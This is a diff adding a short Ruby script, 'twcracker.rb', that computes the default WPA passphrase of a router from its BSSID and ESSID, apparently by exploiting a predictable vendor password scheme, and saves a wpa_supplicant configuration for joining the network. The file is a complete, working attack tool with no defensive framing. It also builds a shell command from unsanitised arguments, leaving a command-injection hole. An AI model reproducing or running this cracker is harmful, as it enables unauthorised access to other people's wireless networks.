@@ -1,0 +1,29 @@
+#!/usr/bin/env ruby
+
+def passgen(bssid, essid)
+  hx = bssid.split(":")
+  h  = "#{hx[3]}#{hx[4]}"
+  el = essid.length - 3
+  ss = essid[0..el]
+  id = essid.gsub(ss, "")
+  pass = "#{ss}#{h}#{id}"
+  fname = "#{bssid.gsub(":", "_")}.conf"
+  system("wpa_passphrase '#{essid }' '#{pass}' > #{fname}")
+  puts "#{essid} => #{pass}", "Saved wpa_supplicant file: #{fname}"
+end
+
+if ARGV[0].empty?
+  puts "Usage: twcracker.rb -b <BSSID -e <ESSID>"
+else
+  ARGV.each do |x|
+    x = x.strip
+    n = ARGV.index(x) + 1
+    case x
+      when "-b"
+        @b = ARGV[n].strip
+      when "-e"
+        @e = ARGV[n].strip
+    end
+  end
+  passgen(@b, @e)
+end  
